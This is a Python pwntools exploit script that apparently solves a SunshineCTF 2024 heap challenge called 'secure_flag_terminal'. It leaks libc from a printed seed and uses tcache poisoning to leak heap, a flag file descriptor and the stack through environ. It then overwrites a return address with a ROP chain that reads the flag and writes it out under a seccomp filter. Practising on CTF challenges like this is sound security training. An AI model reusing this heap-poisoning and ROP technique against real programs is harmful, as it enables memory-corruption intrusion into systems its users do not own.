#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './secure_flag_terminal.nop_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = '2024.sunshinectf.games', 24002

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg

# dup2
# breakrva 0x0fba

# printf at show
# breakrva 0x0139e

# breakrva 0x1743
# breakrva 0x0176e

# return at vim
# breakrva 0x12c5
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
#  line  CODE  JT   JF      K
# =================================
#  0000: 0x20 0x00 0x00 0x00000004  A = arch
#  0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
#  0002: 0x06 0x00 0x00 0x00050000  return ERRNO(0)
#  0003: 0x20 0x00 0x00 0x00000000  A = sys_number
#  0004: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0006
#  0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
#  0006: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0008
#  0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
#  0008: 0x15 0x00 0x01 0x0000000c  if (A != brk) goto 0010
#  0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
#  0010: 0x15 0x00 0x01 0x00000003  if (A != close) goto 0012
#  0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
#  0012: 0x15 0x00 0x01 0x00000005  if (A != fstat) goto 0014
#  0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
#  0014: 0x15 0x00 0x01 0x00000008  if (A != lseek) goto 0016
#  0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW
#  0016: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0018
#  0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW
#  0018: 0x06 0x00 0x00 0x00000000  return KILL

# └──╼ [★]$ pwn checksec secure_flag_terminal
#     Arch:     amd64-64-little
#     RELRO:    Full RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      PIE enabled
#     RUNPATH:  b'$ORIGIN'

def add(size):
    io.sendlineafter(b'option:', b'1')
    io.sendlineafter(b'-->', str(size).encode())

def edit(idx, data):
    io.sendlineafter(b'option:', b'2')
    io.sendlineafter(b'-->', str(idx).encode())
    io.sendlineafter(b'-->', data)

def show(idx):
    io.sendlineafter(b'option:', b'3')
    io.sendlineafter(b'-->', str(idx).encode())

def delete(idx):
    io.sendlineafter(b'option:', b'4')
    io.sendlineafter(b'-->', str(idx).encode())

def exploit():
    global io
    io = initialize()

    io.recvuntil(b'Seed: 0x')
    libc.address = int(io.recvline().strip(), 16) - libc.sym['rand']

    rop = ROP(libc)
    POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
    POP_RSI = rop.find_gadget(['pop rsi', 'ret'])[0]
    POP_RDX = rop.find_gadget(['pop rdx', 'ret'])[0]
    POP_RAX = rop.find_gadget(['pop rax', 'ret'])[0]
    SYSCALL_RET = rop.find_gadget(['syscall', 'ret'])[0]

    add(0x10)
    add(0x10)
    delete(2)
    delete(1)
    add(0x10)
    show(1)
    io.recvuntil(b'=====\n\n')
    heap = u64(io.recvline().strip().ljust(8, b'\x00')) - 0x12b0
    dup_chunk = heap + 0x1270

    add(0x10)
    add(0x10)
    delete(3)
    delete(2)
    edit(1, p64(0x0)*3 + p64(0x21) + p64(dup_chunk))

    add(0x10)
    add(0x10)
    show(3)
    io.recvuntil(b'=====\n\n')
    dup_fd = u64(io.recvline().strip().ljust(8, b'\x00'))

    delete(3)
    delete(2)
    delete(1)

    add(0x20)
    add(0x20)
    add(0x20)
    delete(3)
    delete(2)
    edit(1, p64(0x0)*5 + p64(0x31) + p64(libc.sym['environ']))
    add(0x20)
    add(0x20)
    show(3)
    io.recvuntil(b'=====\n\n')
    stack = u64(io.recvline().strip().ljust(8, b'\x00'))
    rip = stack - 0x120
    
    # delete(3)
    delete(2)
    delete(1)

    add(0x30)
    add(0x30)
    add(0x30)
    delete(4)
    delete(3)
    edit(2, p64(0x0)*7 + p64(0x41) + p64(rip))
    add(0x30)
    add(0x30)

    # pause()
    edit(4, flat([
        POP_RDI,
        dup_fd,
        POP_RSI,
        heap+0x500,
        POP_RDX,
        0x100,
        POP_RAX,
        0x0,
        SYSCALL_RET,

        POP_RDI,
        0x1,
        POP_RAX,
        0x1,
        SYSCALL_RET,
    ]))

    log.info('libc base: %#x', libc.address)
    log.info('heap base: %#x', heap)
    log.info('flag fd: %#x', dup_fd)
    log.info('stack: %#x', stack)
    io.interactive()
    
if __name__ == '__main__':
    exploit()
